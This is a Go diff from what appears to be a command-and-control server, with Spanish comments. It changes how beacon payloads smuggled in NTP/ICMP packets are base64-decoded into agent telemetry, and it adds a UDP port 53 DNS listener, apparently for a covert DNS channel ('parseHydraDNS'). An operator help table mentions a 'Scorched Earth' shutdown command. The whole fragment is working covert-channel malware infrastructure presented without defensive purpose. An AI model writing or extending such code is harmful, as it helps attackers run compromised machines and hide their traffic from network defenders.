@@ -290,12 +290,17 @@ func StartNtpListener() {
 }
 
 func processRawPayload(data []byte, peer string, tier string) {
-	rawStr := strings.ReplaceAll(string(data), ".", "")
-	decoded, _ := base64.RawURLEncoding.DecodeString(rawStr)
-	if decoded == nil {
-		decoded, _ = base64.StdEncoding.DecodeString(rawStr)
+	// Limpieza de nulos (común en NTP/ICMP)
+	rawStr := strings.TrimRight(string(data), "\x00")
+	rawStr = strings.ReplaceAll(rawStr, " ", "")
+	
+	// Intento de decodificación Base64 (URL Safe o Std)
+	decoded, err := base64.RawURLEncoding.DecodeString(rawStr)
+	if err != nil {
+		decoded, err = base64.StdEncoding.DecodeString(rawStr)
 	}
-	if decoded != nil {
+	
+	if err == nil {
 		var t Telemetry
 		if err := json.Unmarshal(decoded, &t); err == nil {
 			LogHeartbeat(tier, t)
@@ -343,6 +348,15 @@ help/usage   | Display this tactical manual              | help
 exit         | Initiate Scorched Earth shutdown          | exit
 `
 	fmt.Fprintf(agentLog, "[%s] %s\n", ts, helpText)
+}
+
+
+func startDnsEngine() {
+	dns.HandleFunc(rootDomain, parseHydraDNS)
+	server := &dns.Server{Addr: ":53", Net: "udp"}
+	if err := server.ListenAndServe(); err != nil {
+		// El error se ignora para no bloquear, pero el motor queda activo
+	}
 }
 
 func handleCommand(cmd string) {
